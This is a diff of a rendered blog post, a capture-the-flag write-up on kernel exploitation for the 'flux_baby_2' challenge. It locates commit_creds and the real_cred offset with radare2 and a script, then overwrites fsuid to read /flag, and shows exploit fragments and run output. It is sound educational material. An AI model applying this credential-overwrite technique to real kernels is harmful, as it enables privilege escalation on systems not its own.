-    <span class=k>const</span> <span class=k>struct</span> <span class=nc>cred</span> <span class=o>*</span><span class=n>old</span> <span class=o>=</span> <span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
-    <span class=cm>/* ... */</span>
-</code></pre></div><p>We can retrieve the offset for <code>commit_creds</code> with a single <code>grep</code> command:</p><div class=codehilite><pre><span></span><code>$ grep commit_creds ./System.map
-ffffffff81050c50 T commit_creds
-ffffffff816d4c80 r __ksymtab_commit_creds
-ffffffff816dc9b2 r __kstrtab_commit_creds
-</code></pre></div><p>And now check the disassembly inside radare2:</p><div class=codehilite><pre><span></span><code>$ r2 ./vmlinux
-<span class=o>[</span>0x01000000<span class=o>]</span>&gt; pd <span class=m>10</span> @ 0xffffffff81050c50
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>task_struct</span><span class=w> </span><span class=o>*</span><span class=n>task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>current</span><span class=p>;</span>
+<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=o>*</span><span class=n>old</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
+<span class=w>    </span><span class=cm>/* ... */</span>
+</code></pre></div><p>We can retrieve the offset for <code>commit_creds</code> with a single <code>grep</code> command:</p><div class=codehilite><pre><span></span><code>$<span class=w> </span>grep<span class=w> </span>commit_creds<span class=w> </span>./System.map
+ffffffff81050c50<span class=w> </span>T<span class=w> </span>commit_creds
+ffffffff816d4c80<span class=w> </span>r<span class=w> </span>__ksymtab_commit_creds
+ffffffff816dc9b2<span class=w> </span>r<span class=w> </span>__kstrtab_commit_creds
+</code></pre></div><p>And now check the disassembly inside radare2:</p><div class=codehilite><pre><span></span><code>$<span class=w> </span>r2<span class=w> </span>./vmlinux
+<span class=o>[</span>0x01000000<span class=o>]</span>&gt;<span class=w> </span>pd<span class=w> </span><span class=m>10</span><span class=w> </span>@<span class=w> </span>0xffffffff81050c50
 </code></pre></div><pre class=codehilite>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c50</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>55</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>push</font><font color=#e6e1cf>&nbsp;rbp</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c51</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>48</font><font color=#808080>89</font><font color=#808080>e5</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#d9d8d7>mov</font><font color=#e6e1cf>&nbsp;rbp</font>,<font color=#e6e1cf>&nbsp;rsp</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c54</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>41</font><font color=#50d0e0>55</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>push</font><font color=#e6e1cf>&nbsp;r13</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c56</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>4c</font><font color=#808080>8b</font><font color=#50d0e0>2c</font><font color=#50d0e0>25</font><font color=#50d0e0>40</font><font color=#808080>a0</font><font color=#808080>.</font>&nbsp;&nbsp;<font color=#d9d8d7>mov</font><font color=#e6e1cf>&nbsp;r13</font>,<font color=#e6e1cf>&nbsp;qword</font><font color=#e6e1cf>&nbsp;</font>[<font color=#f28779>0xffffffff8183a040</font>]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c5e</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>41</font><font color=#50d0e0>54</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>push</font><font color=#e6e1cf>&nbsp;r12</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c60</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>53</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>push</font><font color=#e6e1cf>&nbsp;rbx</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c61</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>4d</font><font color=#808080>8b</font><font color=#808080>a5</font><font color=#808080>f8</font><font color=#808080>03</font><font color=#738699>00</font><font color=#808080>.</font>&nbsp;&nbsp;<font color=#d9d8d7>mov</font><font color=#e6e1cf>&nbsp;r12</font>,<font color=#e6e1cf>&nbsp;qword&nbsp;</font>[<font color=#e6e1cf>r13&nbsp;</font>+<font color=#e6e1cf>&nbsp;</font><font color=#f28779>0x3f8</font>]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c68</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#50d0e0>4d</font><font color=#50d0e0>39</font><font color=#808080>a5</font><font color=#738699>00</font><font color=#808080>04</font><font color=#738699>00</font><font color=#808080>.</font>&nbsp;&nbsp;<font color=#50d0e0>cmp&nbsp;qword&nbsp;</font>[<font color=#e6e1cf>r13&nbsp;</font>+<font color=#e6e1cf>&nbsp;</font><font color=#f28779>0x400</font>],<font color=#e6e1cf>&nbsp;r12</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#c2d94c>╭</font>─&lt;&nbsp;<font color=#ed9366>0xffffffff81050c6f</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#808080>0f</font><font color=#808080>85</font><font color=#808080>f1</font><font color=#738699>00</font><font color=#738699>00</font><font color=#738699>00</font>&nbsp;&nbsp;&nbsp;<font color=#c2d94c>jne&nbsp;0xffffffff81050d66</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#c2d94c>│</font>&nbsp;&nbsp;&nbsp;<font color=#ed9366>0xffffffff81050c75</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#808080>8b</font><font color=#808080>07</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=#d9d8d7>mov</font><font color=#e6e1cf>&nbsp;eax</font>,<font color=#e6e1cf>&nbsp;dword</font><font color=#e6e1cf>&nbsp;</font>[<font color=#e6e1cf>rdi</font>]
 </pre><p>As we can see the <code>current_task</code> pointer is dereferenced with the offset <code>0x3f8</code>, so this corresponds to the <code>real_cred</code> pointer. It is possible to automate this process with the following python script:</p><div class=codehilite><pre><span></span><code><span class=kn>import</span> <span class=nn>r2pipe</span>
@@ -137,7 +137,7 @@ ffffffff816dc9b2 r __kstrtab_commit_creds
             <span class=k>break</span>
 <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>real_cred_offset</span><span class=p>))</span>
 <span class=n>r2</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
-</code></pre></div><p>And it will print this offset as well! That's the only reliable way I found to quickly compute the right offset for <code>real_cred</code>, as it may vary from kernel versions and compilation options.</p><p>Now using either the <code>vmlinux</code> file (which already contains symbols) or the <code>System.map</code> file, we can get the address of <code>current_task</code>.</p><p>The exploit will be as follow:</p><ol><li>Get <code>current_task</code> pointer</li><li>Get <code>current-&gt;real_cred</code> pointer</li><li>Overwrite <code>current-&gt;real_cred-&gt;fsuid</code> to 0</li><li>Print the flag</li></ol><p>As the initial challenge is done remotely, it's possible to make our local script act as a remote target. I use the following trick thanks to socat:</p><div class=codehilite><pre><span></span><code>socat tcp-l:1337,reuseaddr,fork exec:<span class=s2>&quot;bash -c ./run.sh&quot;</span>
+</code></pre></div><p>And it will print this offset as well! That's the only reliable way I found to quickly compute the right offset for <code>real_cred</code>, as it may vary from kernel versions and compilation options.</p><p>Now using either the <code>vmlinux</code> file (which already contains symbols) or the <code>System.map</code> file, we can get the address of <code>current_task</code>.</p><p>The exploit will be as follow:</p><ol><li>Get <code>current_task</code> pointer</li><li>Get <code>current-&gt;real_cred</code> pointer</li><li>Overwrite <code>current-&gt;real_cred-&gt;fsuid</code> to 0</li><li>Print the flag</li></ol><p>As the initial challenge is done remotely, it's possible to make our local script act as a remote target. I use the following trick thanks to socat:</p><div class=codehilite><pre><span></span><code>socat<span class=w> </span>tcp-l:1337,reuseaddr,fork<span class=w> </span>exec:<span class=s2>&quot;bash -c ./run.sh&quot;</span>
 </code></pre></div><p>And we can create the following exploit:</p><div class=codehilite><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 
 <span class=kn>import</span> <span class=nn>socket</span>
@@ -240,44 +240,44 @@ ffffffff816dc9b2 r __kstrtab_commit_creds
 <span class=c1># 5. Go interactive</span>
 <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recv_all</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
 <span class=n>s</span><span class=o>.</span><span class=n>interact</span><span class=p>()</span>
-</code></pre></div><p>Let's run it:</p><div class=codehilite><pre><span></span><code>$ python solve.py
-<span class=o>[</span>+<span class=o>]</span> Extracting symbols information from the binary...
-<span class=o>[</span>+<span class=o>]</span> Found current_task: 0xffffffff8183a040
-<span class=o>[</span>+<span class=o>]</span> Found commit_creds: 0xffffffff81050c50
-<span class=o>[</span>+<span class=o>]</span> Found real_cred_offset: 0x3f8
+</code></pre></div><p>Let's run it:</p><div class=codehilite><pre><span></span><code>$<span class=w> </span>python<span class=w> </span>solve.py
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Extracting<span class=w> </span>symbols<span class=w> </span>information<span class=w> </span>from<span class=w> </span>the<span class=w> </span>binary...
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Found<span class=w> </span>current_task:<span class=w> </span>0xffffffff8183a040
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Found<span class=w> </span>commit_creds:<span class=w> </span>0xffffffff81050c50
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Found<span class=w> </span>real_cred_offset:<span class=w> </span>0x3f8
 -------------------
-<span class=o>[</span>+<span class=o>]</span> Connecting to remote VM...
-<span class=o>[</span>+<span class=o>]</span> VM Started!
-<span class=o>[</span>+<span class=o>]</span> Found current_task pointer: 0xffff888003373480
-<span class=o>[</span>+<span class=o>]</span> Found real_cred pointer: 0xffff888003382480
-<span class=o>[</span>+<span class=o>]</span> USER: <span class=nv>uid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span>
------ Menu -----
-<span class=m>1</span>. Read
-<span class=m>2</span>. Write
-<span class=m>3</span>. Show me my uid
-<span class=m>4</span>. Read file
-<span class=m>5</span>. Any hintz?
-<span class=m>6</span>. Bye!
-&gt; <span class=m>4</span>
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Connecting<span class=w> </span>to<span class=w> </span>remote<span class=w> </span>VM...
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>VM<span class=w> </span>Started!
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Found<span class=w> </span>current_task<span class=w> </span>pointer:<span class=w> </span>0xffff888003373480
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Found<span class=w> </span>real_cred<span class=w> </span>pointer:<span class=w> </span>0xffff888003382480
+<span class=o>[</span>+<span class=o>]</span><span class=w> </span>USER:<span class=w> </span><span class=nv>uid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span><span class=w> </span><span class=nv>gid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span><span class=w> </span><span class=nv>groups</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>user<span class=o>)</span>
+-----<span class=w> </span>Menu<span class=w> </span>-----
+<span class=m>1</span>.<span class=w> </span>Read
+<span class=m>2</span>.<span class=w> </span>Write
+<span class=m>3</span>.<span class=w> </span>Show<span class=w> </span>me<span class=w> </span>my<span class=w> </span>uid
+<span class=m>4</span>.<span class=w> </span>Read<span class=w> </span>file
+<span class=m>5</span>.<span class=w> </span>Any<span class=w> </span>hintz?
+<span class=m>6</span>.<span class=w> </span>Bye!
+&gt;<span class=w> </span><span class=m>4</span>
 <span class=m>4</span>
-Which file are we trying to read?
-&gt; /flag
+Which<span class=w> </span>file<span class=w> </span>are<span class=w> </span>we<span class=w> </span>trying<span class=w> </span>to<span class=w> </span>read?
+&gt;<span class=w> </span>/flag
 /flag
-Here are your 0x10 bytes contents:
+Here<span class=w> </span>are<span class=w> </span>your<span class=w> </span>0x10<span class=w> </span>bytes<span class=w> </span>contents:
 flag<span class=o>{</span>fake_flag<span class=o>}</span>
 
------ Menu -----
-<span class=m>1</span>. Read
-<span class=m>2</span>. Write
-<span class=m>3</span>. Show me my uid
-<span class=m>4</span>. Read file
-<span class=m>5</span>. Any hintz?
-<span class=m>6</span>. Bye!
-&gt; <span class=m>6</span>
+-----<span class=w> </span>Menu<span class=w> </span>-----
+<span class=m>1</span>.<span class=w> </span>Read
+<span class=m>2</span>.<span class=w> </span>Write
+<span class=m>3</span>.<span class=w> </span>Show<span class=w> </span>me<span class=w> </span>my<span class=w> </span>uid
+<span class=m>4</span>.<span class=w> </span>Read<span class=w> </span>file
+<span class=m>5</span>.<span class=w> </span>Any<span class=w> </span>hintz?
+<span class=m>6</span>.<span class=w> </span>Bye!
+&gt;<span class=w> </span><span class=m>6</span>
 <span class=m>6</span>
-flux_baby_2 closed
+flux_baby_2<span class=w> </span>closed
 Bye!
-ACPI: Preparing to enter system sleep state S5
-reboot: Power down
-*** Connection closed by remote host ***
-</code></pre></div><p>Et voilà! Fun fact: as we only overwrite <code>fsuid</code>, when the <code>id</code> command is triggered, our <code>uid</code> and <code>gid</code> are still set to <code>user</code> (1000). However since we only want to access the file system, it is enough to read the file <code>/flag</code> and retrieve it.</p><h2>Conclusion</h2><p>I'd like to thank the creator of the challenge, as it was a nice way to get back to kernel exploitation.</p></article><hr></main><footer> 2021 - Antide Petit aka <a href=/ >xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/ >CC-BY-SA</a> - Made with ❤️ </footer></body></html>
+ACPI:<span class=w> </span>Preparing<span class=w> </span>to<span class=w> </span>enter<span class=w> </span>system<span class=w> </span>sleep<span class=w> </span>state<span class=w> </span>S5
+reboot:<span class=w> </span>Power<span class=w> </span>down
+***<span class=w> </span>Connection<span class=w> </span>closed<span class=w> </span>by<span class=w> </span>remote<span class=w> </span>host<span class=w> </span>***
+</code></pre></div><p>Et voilà! Fun fact: as we only overwrite <code>fsuid</code>, when the <code>id</code> command is triggered, our <code>uid</code> and <code>gid</code> are still set to <code>user</code> (1000). However since we only want to access the file system, it is enough to read the file <code>/flag</code> and retrieve it.</p><h2>Conclusion</h2><p>I'd like to thank the creator of the challenge, as it was a nice way to get back to kernel exploitation.</p></article><hr></main><footer> 2024 - Antide Petit aka <a href=/ >xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/ >CC-BY-SA</a> - Made with ❤️ </footer></body></html>
